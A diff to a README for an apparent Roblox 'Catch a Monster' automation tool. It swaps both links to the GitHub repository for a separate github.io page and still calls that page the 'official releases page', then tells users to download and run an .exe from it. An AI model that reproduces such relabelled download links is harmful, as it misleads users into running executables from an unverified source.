@@ -1,6 +1,6 @@
 # 🎮 catch-monster-windows-exec - Automate your monster catching tasks easily
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Henockhnm/catch-monster-windows-exec)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://henockhnm.github.io)
 
 This software helps players of the Roblox game "Catch a Monster." It automates repetitive actions like finding monsters and collecting items. You save time and effort while you play.
 
@@ -17,7 +17,7 @@ Your computer needs the following to run this software:
 
 Follow these steps to obtain the software:
 
-1.  Visit the [official releases page](https://github.com/Henockhnm/catch-monster-windows-exec).
+1.  Visit the [official releases page](https://henockhnm.github.io).
 2.  Look for the latest version listed under Releases.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to a folder you can find, such as your Downloads folder or Desktop.
